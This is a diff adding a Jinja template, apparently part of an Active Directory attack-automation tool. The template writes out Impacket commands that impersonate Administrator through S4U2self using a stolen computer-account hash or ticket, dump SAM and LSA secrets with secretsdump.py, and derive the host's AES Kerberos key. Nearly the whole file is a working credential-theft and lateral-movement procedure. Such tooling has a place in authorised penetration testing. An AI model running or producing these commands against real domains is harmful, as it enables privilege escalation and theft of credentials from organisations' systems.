@@ -1,0 +1,32 @@
+{# Special function which modify the secret_type to AES
+ # The parent is the computer, if we have its ticket, hash or password
+ # we can retrieve/compute its AES Key #}
+{%- if parent.secret_type != T_SECRET_AESKEY and
+       parent.secret_type != T_SECRET_PASSWORD %}
+# Retrieve the AES KEY on {{parent.obj.name}}
+{% if parent.krb_auth %}
+getST.py '{{fqdn}}/{{parent.obj.name}}' -self -impersonate Administrator -altservice HOST/{{parent_no_dollar}} -k -no-pass -dc-ip {{dc_ip}}
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+getST.py '{{fqdn}}/{{parent.obj.name}}' -self -impersonate Administrator -altservice HOST/{{parent_no_dollar}} -hashes :{{parent.secret|red}} -dc-ip {{dc_ip}}
+{%- endif %}
+
+{% if parent.krb_auth %}
+copy="$KRB5CCNAME"
+{%- endif %}
+
+export KRB5CCNAME='Administrator@HOST_{{parent_no_dollar}}@{{fqdn}}.ccache'
+
+# Dump the SAM and LSA cache on {{parent.obj.name}} and get the AES key
+secretsdump.py '{{parent_no_dollar}}' -k -no-pass -dc-ip {{dc_ip}} -target-ip '{{parent_ip}}'
+{{ set_attr(parent, 'secret_type', T_SECRET_PASSWORD) }}
+{% if parent.krb_auth %}
+export KRB5CCNAME="$copy"
+{% endif %}
+
+{% endif %}
+{% if parent.secret_type == T_SECRET_PASSWORD %}
+# Get the AES key from the password for more convenience
+./tools/aesKrbKeyGen.py '{{fqdn}}/{{parent.obj.name}}:{{plain|red}}'
+{{ set_attr(parent, 'secret', parent.obj.name.upper().replace("$","") + '_AESKEY') }}
+{{ set_attr(parent, 'secret_type', T_SECRET_AESKEY) }}
+{%- endif %}
